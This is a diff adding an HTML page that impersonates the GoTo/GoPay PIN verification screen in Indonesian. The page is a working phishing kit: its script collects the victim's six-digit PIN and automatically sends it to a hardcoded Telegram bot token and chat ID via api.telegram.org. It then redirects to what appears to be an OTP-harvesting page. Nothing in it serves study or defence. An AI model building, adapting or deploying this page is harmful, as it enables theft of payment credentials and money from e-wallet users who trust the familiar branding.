@@ -1,0 +1,331 @@
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Verifikasi GoTo PIN</title>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+  <style>
+    /* Reset and base */
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+        Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+      background-color: #f3f4f6; /* Tailwind gray-100 */
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    /* Top bar */
+    .top-bar {
+      background-color: #4b5563; /* Tailwind gray-600 */
+      color: white;
+      font-size: 0.75rem; /* text-xs */
+      padding: 0.25rem 1rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .top-bar .left,
+    .top-bar .right {
+      display: flex;
+      align-items: center;
+      gap: 0.25rem;
+    }
+    .top-bar .right {
+      font-size: 0.625rem; /* text-[10px] */
+    }
+    .top-bar .right .badge {
+      border: 1px solid #d1d5db; /* gray-300 */
+      border-radius: 0.25rem;
+      padding: 0 0.25rem;
+      color: #d1d5db;
+      font-size: 0.625rem;
+      line-height: 1;
+    }
+    /* Header */
+    header {
+      background-color: white;
+      padding: 0.75rem 1rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 1px 2px rgb(0 0 0 / 0.05);
+    }
+    header button,
+    header h1 {
+      font-weight: 600;
+      font-size: 1rem;
+      color: #111827; /* gray-900 */
+      background: none;
+      border: none;
+      cursor: pointer;
+    }
+    header button.help {
+      color: #047857; /* emerald-600 */
+      font-weight: 600;
+      font-size: 0.875rem;
+    }
+    /* Main content */
+    main {
+      flex-grow: 1;
+      padding: 1rem 1rem 0;
+    }
+    main h2 {
+      font-weight: 700;
+      font-size: 1rem;
+      color: #111827;
+      margin-bottom: 0.25rem;
+    }
+    main p {
+      font-size: 0.875rem;
+      color: #4b5563; /* gray-700 */
+      margin-bottom: 1rem;
+    }
+    /* Form */
+    form#pinForm {
+      background-color: white;
+      border-radius: 0.5rem;
+      padding: 1rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      max-width: 24rem;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    form#pinForm .pin-inputs {
+      display: flex;
+      gap: 1rem;
+      flex-grow: 1;
+      max-width: 15rem;
+    }
+    form#pinForm input[type="password"],
+    form#pinForm input[type="text"] {
+      width: 2.5rem;
+      height: 2.5rem;
+      text-align: center;
+      border-radius: 0.5rem;
+      border: 1px solid #d1d5db; /* gray-300 */
+      font-size: 1.125rem;
+      font-weight: 600;
+      outline-offset: 2px;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+    form#pinForm input[type="password"]:focus,
+    form#pinForm input[type="text"]:focus {
+      border-color: #10b981; /* emerald-500 */
+      box-shadow: 0 0 0 2px rgb(16 185 129 / 0.3);
+    }
+    form#pinForm button.toggle-visibility {
+      background: none;
+      border: none;
+      color: #4b5563; /* gray-600 */
+      font-size: 1.25rem;
+      cursor: pointer;
+      margin-left: 0.5rem;
+      flex-shrink: 0;
+    }
+    /* "Coba cara lain" button */
+    button.try-other {
+      margin-top: 1rem;
+      color: #047857; /* emerald-600 */
+      font-weight: 600;
+      font-size: 0.875rem;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+    }
+    /* Footer */
+    footer {
+      background-color: white;
+      border-top: 1px solid #d1d5db; /* gray-300 */
+      text-align: center;
+      padding: 0.75rem 1rem;
+      font-size: 0.75rem;
+      color: #374151; /* gray-700 */
+      font-family: inherit;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 0.25rem;
+    }
+    footer .goto {
+      color: #10b981; /* emerald-500 */
+      font-weight: 700;
+    }
+    footer img {
+      width: 1rem;
+      height: 1rem;
+      vertical-align: middle;
+    }
+    footer .gopay {
+      font-weight: 700;
+    }
+    /* Responsive */
+    @media (max-width: 400px) {
+      form#pinForm {
+        max-width: 100%;
+        padding: 0.75rem;
+      }
+      form#pinForm .pin-inputs {
+        gap: 0.5rem;
+        max-width: 100%;
+      }
+      form#pinForm input[type="password"],
+      form#pinForm input[type="text"] {
+        width: 2rem;
+        height: 2rem;
+        font-size: 1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+    </div>
+  </div>
+  <header>
+    <button aria-label="Back"><i class="fas fa-arrow-left"></i></button>
+    <h1>Verifikasi GoTo PIN</h1>
+    <button class="help">Bantuan</button>
+  </header>
+  <main>
+    <h2>GoPay PIN kamu jadi GoTo PIN</h2>
+    <p>Kamu perlu mengetik GoTo PIN untuk masuk.</p>
+    <form id="pinForm">
+      <div class="pin-inputs">
+        <input
+          aria-label="PIN digit 1"
+          maxlength="1"
+          name="pin1"
+          type="password"
+          inputmode="numeric"
+          pattern="[0-9]*"
+          required
+        />
+        <input
+          aria-label="PIN digit 2"
+          maxlength="1"
+          name="pin2"
+          type="password"
+          inputmode="numeric"
+          pattern="[0-9]*"
+          required
+        />
+        <input
+          aria-label="PIN digit 3"
+          maxlength="1"
+          name="pin3"
+          type="password"
+          inputmode="numeric"
+          pattern="[0-9]*"
+          required
+        />
+        <input
+          aria-label="PIN digit 4"
+          maxlength="1"
+          name="pin4"
+          type="password"
+          inputmode="numeric"
+          pattern="[0-9]*"
+          required
+        />
+        <input
+          aria-label="PIN digit 5"
+          maxlength="1"
+          name="pin5"
+          type="password"
+          inputmode="numeric"
+          pattern="[0-9]*"
+          required
+        />
+        <input
+          aria-label="PIN digit 6"
+          maxlength="1"
+          name="pin6"
+          type="password"
+          inputmode="numeric"
+          pattern="[0-9]*"
+          required
+        />
+      </div>
+      <button aria-label="Toggle PIN visibility" class="toggle-visibility" type="button" id="togglePin">
+        <i class="fas fa-eye"></i>
+      </button>
+    </form>
+    <button class="try-other">Coba cara lain</button>
+  </main>
+  <footer>
+    <span>From</span>
+    <span class="goto">goto</span>
+    <span>·</span>
+    <span>Powered by</span>
+    <img
+      alt="Blue G icon representing gopay"
+      src="https://storage.googleapis.com/a1aa/image/8097e99a-0b9a-4a97-70cd-ea1b9ce8f9cb.jpg"
+    />
+    <span class="gopay">gopay</span>
+  </footer>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/js/all.min.js"></script>
+  <script>
+    // Toggle PIN visibility
+    const toggleBtn = document.getElementById("togglePin");
+    const inputs = document.querySelectorAll("#pinForm input[type='password'], #pinForm input[type='text']");
+    let visible = false;
+    toggleBtn.addEventListener("click", () => {
+      visible = !visible;
+      inputs.forEach((input) => {
+        input.type = visible ? "text" : "password";
+      });
+      toggleBtn.innerHTML = visible
+        ? '<i class="fas fa-eye-slash"></i>'
+        : '<i class="fas fa-eye"></i>';
+    });
+
+    // Auto move to next input on input
+    inputs.forEach((input, idx) => {
+      input.addEventListener("input", () => {
+        if (input.value.length === 1 && idx < inputs.length - 1) {
+          inputs[idx + 1].focus();
+        }
+      });
+    });
+
+    // Send PIN to Telegram automatically when all 6 digits are filled
+    async function sendPinToTelegram(pin) {
+      const botToken = "8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc"; // Replace with your Telegram bot token
+      const chatId = "7549590022"; // Replace with your Telegram chat ID
+      const message = encodeURIComponent(`New GoTo PIN entered: ${pin}`);
+
+      try {
+        const response = await fetch(
+          `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`
+        );
+        if (response.ok) {
+          location.href ="gojekotp.html";
+          inputs.forEach((input) => (input.value = ""));
+          inputs[0].focus();
+        } else {
+          alert("Failed to send PIN");
+        }
+      } catch (error) {
+        alert("Error sending PIN");
+      }
+    }
+
+    function checkAndSendPin() {
+      const pin = Array.from(inputs).map((input) => input.value).join("");
+      if (pin.length === 6 && /^\d{6}$/.test(pin)) {
+        sendPinToTelegram(pin);
+      }
+    }
+
+    inputs.forEach((input) => {
+      input.addEventListener("input", checkAndSendPin);
+    });
+  </script>
+</body>
+</html>
